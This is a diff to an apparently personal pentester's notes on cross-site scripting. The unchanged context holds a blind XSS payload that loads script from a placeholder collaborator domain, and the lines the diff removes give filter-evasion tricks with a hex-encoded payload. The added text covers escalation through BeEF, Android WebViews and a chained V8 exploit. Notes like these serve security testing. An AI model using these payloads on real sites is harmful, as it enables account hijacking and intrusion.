@@ -1,13 +1,3 @@
-## Обфускация
-
-- против регулярок - переносы строк, смена регистра
-- внутри HTML-атрибутов и SVG-тегов можно использовать XML/HTML entity encoding
-- названия функций можно кодировать в UTF  `\u00 + 'Щ'.charCodeAt(0).String(16)`
-- в функцию можно передать hex-энкод:
-
-```js
-setTimeout`\x61\x6c\x65\x72\x74\x28\x31\x29\` 
-```
 
 ## Blind XSS
 
@@ -21,7 +11,7 @@ setTimeout`\x61\x6c\x65\x72\x74\x28\x31\x29\`
 </script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>
 ```
 
-## Server-side
+## Server-side XSS
 
 by [slonser](https://t.me/slonser_notes)
 
@@ -64,6 +54,12 @@ a
 
 ## DOM XSS
 
-### DOM Clobbering
 
-https://domclob.xyz/
+
+## Leveraging
+
+Tunneling into internal networks is possible via [BeEF (The Browser Exploitation Framework)](https://github.com/beefproject/beef) payload. 
+
+Misconfigured JavascriptInterface in Android WebViews may esaclate XSS to LFR or RCE.
+
+When an XSS is chained with a sandbox bypass exploit, it can lead to intial access to the underlying device OS ([[Browser security]]). An example of such exploit is [CVE-2021-30632](https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html), use-after-free in V8, explained in [Chrome in-the-wild bug analysis](https://github.blog/security/vulnerability-research/chrome-in-the-wild-bug-analysis-cve-2021-30632/).
